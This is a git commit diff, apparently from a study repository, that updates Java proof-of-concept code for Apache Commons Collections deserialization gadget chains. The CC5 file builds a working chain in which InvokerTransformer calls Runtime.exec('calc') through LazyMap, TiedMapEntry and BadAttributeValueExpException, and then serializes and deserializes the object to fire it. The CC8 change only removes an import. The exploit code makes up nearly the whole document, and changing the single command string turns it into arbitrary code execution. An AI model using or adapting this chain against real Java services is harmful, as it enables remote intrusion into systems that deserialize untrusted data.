edb6049260001bc96e336fcec2f507982d1f82d6
3xsh0re <1752095049@qq.com>
2024-10-06 00:08:21 +0800

    更新CC-5

--- src/main/java/org/example/CC5.java
+++ src/main/java/org/example/CC5.java
@@ -7,17 +7,19 @@ import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 
-import java.io.*;
+import javax.management.BadAttributeValueExpException;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
 import java.lang.reflect.Field;
 import java.util.HashMap;
-import java.util.HashSet;
 import java.util.Map;
 
-public class CC6 {
+public class CC5 {
     public static void main(String[] args) throws Exception {
-        Transformer[] fakeFormer = new Transformer[]{new ConstantTransformer(1)};
-        // 第一层
-        Transformer[] tfs = new Transformer[]{
+        Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
+        Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod",
                         new Class[]{String.class, Class[].class},
@@ -27,28 +29,29 @@ public class CC6 {
                         new Object[]{null, null}),
                 new InvokerTransformer("exec",
                         new Class[]{String.class},
-                        new Object[]{"calc"}),
-                new ConstantTransformer(1)
+                        new Object[]{"calc"})
         };
-        Transformer transformerChain = new ChainedTransformer(fakeFormer);
-        Map lazyMap = LazyMap.decorate(new HashMap<>(),transformerChain);
-        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"key");
-        Map tiedMap = new HashMap<>();
-        tiedMap.put(tiedMapEntry,"Exp");
-        HashSet hashSet = new HashSet(1);
-        hashSet.add(tiedMap);
-        lazyMap.remove("key");
-//        反射修改变量
+        // 第二层
+        Map<Object, Object> hashMap = new HashMap<>();
+        Map innerMap = LazyMap.decorate(hashMap,transformerChain);
+        TiedMapEntry mapEntry = new TiedMapEntry(innerMap,"3xsh0re");
+        BadAttributeValueExpException attributeValue = new BadAttributeValueExpException(mapEntry);
+
         Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
         f.setAccessible(true);
-        f.set(transformerChain, tfs);
+        f.set(transformerChain,transformers);
+
+        Field f2 = BadAttributeValueExpException.class.getDeclaredField("val");
+        f2.setAccessible(true);
+        f2.set(attributeValue,mapEntry);
 
         // 测试
         ByteArrayOutputStream barr = new ByteArrayOutputStream();
         ObjectOutputStream oos = new ObjectOutputStream(barr);
-        oos.writeObject(hashSet);
+        oos.writeObject(attributeValue);
         oos.close();
         ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
         ois.readObject();
     }
+
 }
--- src/main/java/org/example/CC8.java
+++ src/main/java/org/example/CC8.java
@@ -17,7 +17,6 @@ import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.lang.reflect.Field;
 import java.util.Base64;
-import java.util.TreeMap;
 
 public class CC8 {
     public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
